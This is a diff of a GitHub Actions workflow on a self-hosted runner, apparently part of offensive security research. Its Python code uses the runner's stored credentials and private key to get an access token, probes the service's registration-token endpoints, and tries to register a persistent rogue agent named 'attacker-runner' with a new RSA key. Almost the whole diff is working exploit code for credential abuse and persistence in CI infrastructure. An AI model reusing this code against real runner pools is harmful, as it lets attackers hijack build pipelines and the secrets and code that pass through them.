@@ -4,7 +4,7 @@ jobs:
   find:
     runs-on: self-hosted
     steps:
-      - name: Find Correct Endpoint
+      - name: Register New Agent
         run: |
           RUNNER_BASE="/Users/delledoxsecurity/github/d/actions-runner"
           
@@ -46,7 +46,6 @@ jobs:
           client_id = creds['data']['clientId']
           auth_url = creds['data']['authorizationUrl']
           server_url = runner['serverUrl']
-          server_url_v2 = runner['serverUrlV2']
           pool_id = runner['poolId']
           agent_id = runner['agentId']
           
@@ -61,7 +60,6 @@ jobs:
               'jti': str(now)
           }
           client_assertion = jwt.encode(payload, private_key, algorithm='RS256')
-          
           form_data = urllib.parse.urlencode({
               'grant_type': 'client_credentials',
               'client_assertion_type': 'urn:ietf:params:oauth:client-assertion-type:jwt-bearer',
@@ -77,86 +75,111 @@ jobs:
               }
           )
           with urllib.request.urlopen(req) as resp:
-              token_response = json.loads(resp.read().decode())
-              access_token = token_response['access_token']
+              access_token = json.loads(resp.read().decode())['access_token']
               print('Access Token Obtained!')
           
-          headers_auth = {
+          auth_headers = {
               'Authorization': f'Bearer {access_token}',
               'Accept': 'application/json',
               'Content-Type': 'application/json'
           }
           
-          headers_post = {
-              'Authorization': f'Bearer {access_token}',
-              'Accept': 'application/json',
-              'Content-Length': '0'
-          }
+          # First get full agent details to understand structure
+          print('\n=== GET FULL AGENT DETAILS ===')
+          req = urllib.request.Request(
+              f'{server_url}_apis/distributedtask/pools/{pool_id}/agents/{agent_id}?includeCapabilities=true&includeAssignedRequest=true',
+              method='GET',
+              headers=auth_headers
+          )
+          with urllib.request.urlopen(req) as resp:
+              agent_data = json.loads(resp.read().decode())
+              print(json.dumps(agent_data, indent=2))
           
-          # Try correct Azure DevOps style endpoints
+          # Try to get registration token via correct endpoint
+          print('\n=== TRY GENERATE REGISTRATION TOKEN ===')
+          
           endpoints = [
-              # Connection data - verify token works
-              ('CONNECTION DATA', 'GET',
-               f'{server_url}_apis/connectionData',
-               headers_auth, None),
-               
-              # List agents in pool
-              ('LIST AGENTS', 'GET',
-               f'{server_url}_apis/distributedtask/pools/{pool_id}/agents',
-               headers_auth, None),
-               
-              # Get specific agent
-              ('GET AGENT', 'GET',
-               f'{server_url}_apis/distributedtask/pools/{pool_id}/agents/{agent_id}',
-               headers_auth, None),
-               
-              # Agent registration token - correct endpoint
-              ('AGENT REG TOKEN', 'GET',
-               f'{server_url}_apis/distributedtask/pools/{pool_id}/agentregistration',
-               headers_auth, None),
-               
-              # Try broker v2 endpoints
-              ('BROKER CONNECTION', 'GET',
-               f'{server_url_v2}_apis/connectionData',
-               headers_auth, None),
-               
-              # Try generating new token via agent endpoint
-              ('NEW AGENT TOKEN', 'POST',
-               f'{server_url}_apis/distributedtask/pools/{pool_id}/agents',
-               headers_post, b''),
-               
-              # vstoken endpoint
-              ('VSTOKEN', 'POST',
-               f'https://vstoken.actions.githubusercontent.com/_apis/oauth2/token',
-               {**headers_post, 
-                'Content-Type': 'application/x-www-form-urlencoded'},
-               urllib.parse.urlencode({
-                   'grant_type': 'client_credentials',
-                   'client_id': client_id
-               }).encode()),
+              # Try generating token for existing agent
+              f'{server_url}_apis/distributedtask/pools/{pool_id}/agents/{agent_id}/registrationtoken',
+              # Try pool level registration token
+              f'{server_url}_apis/distributedtask/pools/{pool_id}/registrationtoken',
+              # Try with api-version
+              f'{server_url}_apis/distributedtask/pools/{pool_id}/agentregistration?api-version=6.0',
+              # Try GitHub Actions specific endpoint
+              f'{server_url}_apis/github/runner/registration',
           ]
           
-          for name, method, ep, hdrs, data in endpoints:
-              print(f'\n--- {name} ---')
-              print(f'URL: {ep}')
+          for ep in endpoints:
+              print(f'\n--- {ep} ---')
               try:
-                  reg_req = urllib.request.Request(
-                      ep,
-                      method=method,
-                      data=data,
-                      headers=hdrs
+                  req = urllib.request.Request(
+                      ep, method='GET',
+                      headers=auth_headers
                   )
-                  with urllib.request.urlopen(reg_req) as reg_resp:
-                      response = reg_resp.read().decode()
-                      print(f'SUCCESS {reg_resp.status}:')
-                      # Pretty print if JSON
-                      try:
-                          print(json.dumps(json.loads(response), indent=2)[:500])
-                      except:
-                          print(response[:500])
+                  with urllib.request.urlopen(req) as resp:
+                      print(f'GET SUCCESS:', resp.read().decode()[:300])
               except urllib.error.HTTPError as e:
-                  body = e.read().decode()[:300]
-                  print(f'HTTP {e.code}:', body)
-              except Exception as ex:
-                  print('Error:', str(ex))
+                  print(f'GET HTTP {e.code}:', e.read().decode()[:200])
+              
+              try:
+                  req = urllib.request.Request(
+                      ep, method='POST',
+                      data=b'',
+                      headers={**auth_headers, 'Content-Length': '0'}
+                  )
+                  with urllib.request.urlopen(req) as resp:
+                      print(f'POST SUCCESS:', resp.read().decode()[:300])
+              except urllib.error.HTTPError as e:
+                  print(f'POST HTTP {e.code}:', e.read().decode()[:200])
+          
+          # Try register NEW agent with proper body
+          print('\n=== REGISTER NEW AGENT ===')
+          
+          # Generate new RSA key for fake agent
+          from cryptography.hazmat.primitives.asymmetric import rsa
+          from cryptography.hazmat.primitives import serialization
+          
+          new_key = rsa.generate_private_key(
+              public_exponent=65537,
+              key_size=2048,
+              backend=default_backend()
+          )
+          new_pub = new_key.public_key()
+          pub_numbers = new_pub.public_key().public_numbers() if hasattr(new_pub, 'public_key') else new_pub.public_numbers()
+          
+          def int_to_b64(n):
+              length = (n.bit_length() + 7) // 8
+              return base64.urlsafe_b64encode(n.to_bytes(length, 'big')).rstrip(b'=').decode()
+          
+          pub_nums = new_pub.public_numbers()
+          
+          agent_body = json.dumps({
+              'name': 'attacker-runner',
+              'version': '2.333.1',
+              'osDescription': 'macOS',
+              'ephemeral': False,
+              'disableUpdate': False,
+              'labels': [
+                  {'name': 'self-hosted', 'type': 'system'},
+                  {'name': 'macOS', 'type': 'system'}
+              ],
+              'publicKey': {
+                  'exponent': int_to_b64(pub_nums.e),
+                  'modulus': int_to_b64(pub_nums.n)
+              }
+          }).encode()
+          
+          try:
+              req = urllib.request.Request(
+                  f'{server_url}_apis/distributedtask/pools/{pool_id}/agents',
+                  method='POST',
+                  data=agent_body,
+                  headers=auth_headers
+              )
+              with urllib.request.urlopen(req) as resp:
+                  response = resp.read().decode()
+                  print('NEW AGENT REGISTERED!')
+                  print(json.dumps(json.loads(response), indent=2))
+          except urllib.error.HTTPError as e:
+              print(f'HTTP {e.code}:', e.read().decode()[:300])
           "
